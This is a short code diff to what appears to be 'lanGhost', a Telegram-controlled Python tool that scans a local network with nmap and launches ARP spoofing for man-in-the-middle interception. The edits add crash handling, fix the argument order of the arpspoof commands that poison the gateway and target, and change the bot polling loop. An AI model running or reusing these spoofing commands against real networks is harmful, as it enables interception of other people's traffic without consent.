@@ -122,8 +122,11 @@ def scan():
     if not refreshNetworkInfo():
         return "NETERROR"
     global ip_range
-    nm = nmap.PortScanner()
-    scan = nm.scan(hosts=ip_range, arguments='-sP')
+    try:
+        nm = nmap.PortScanner()
+        scan = nm.scan(hosts=ip_range, arguments='-sP')
+    except:
+        return "CRASH"
     hosts = []
     for host in scan["scan"]:
         if "mac" in scan["scan"][host]["addresses"]:
@@ -244,7 +247,7 @@ def subscriptionHandler(bot):
     while True:
         print("[+] Scanning for new hosts...")
         new_hosts = scan()
-        if new_hosts == "NETERROR":
+        if new_hosts == "NETERROR" or new_hosts == "CRASH":
             time.sleep(5)
             continue
         connected_hosts = []
@@ -286,8 +289,8 @@ def arpSpoof(target):
     global interface
     global gw_ip
     print("[+] ARP Spoofing " + str(target[0]) + "...")
-    os.system("sudo screen -S lanGhost-arp-" + target[0] + "-0 -m -d arpspoof -c " + target[0] + " -t " + gw_ip + " -i " + interface)
-    os.system("sudo screen -S lanGhost-arp-" + target[0] + "-1 -m -d arpspoof -c " + gw_ip + " -t " + target[0] + " -i " + interface)
+    os.system("sudo screen -S lanGhost-arp-" + target[0] + "-0 -m -d arpspoof -t " + target[0] + " " + gw_ip + " -i " + interface)
+    os.system("sudo screen -S lanGhost-arp-" + target[0] + "-1 -m -d arpspoof -t " + gw_ip + " " + target[0] + " -i " + interface)
 
 def mitmHandler(target, ID, bot):
     global admin_chatid
@@ -1002,13 +1005,10 @@ def main():
     dispatcher.add_handler(MessageHandler(Filters.command, msg_unknown))
 
     print("[+] Telegram bot started...")
-    while True:
-        try:
-            updater.start_polling()
-        except KeyboardInterrupt:
-            stopping()
-        except:
-            print("[!!!] Telegram bot crashed, restating...")
+    updater.start_polling()
+
+    while updater.running:
+        time.sleep(1)
 
 if __name__ == '__main__':
     if os.geteuid() != 0:
@@ -1070,5 +1070,6 @@ if __name__ == '__main__':
         except KeyboardInterrupt:
             stopping()
         except:
-            print("[!] Error while starting Telegram bot. Restarting...")
+            print(str(traceback.format_exc()))
+            print("[!] Something went wrong with the Telegram bot. Restarting...")
             time.sleep(0.5)
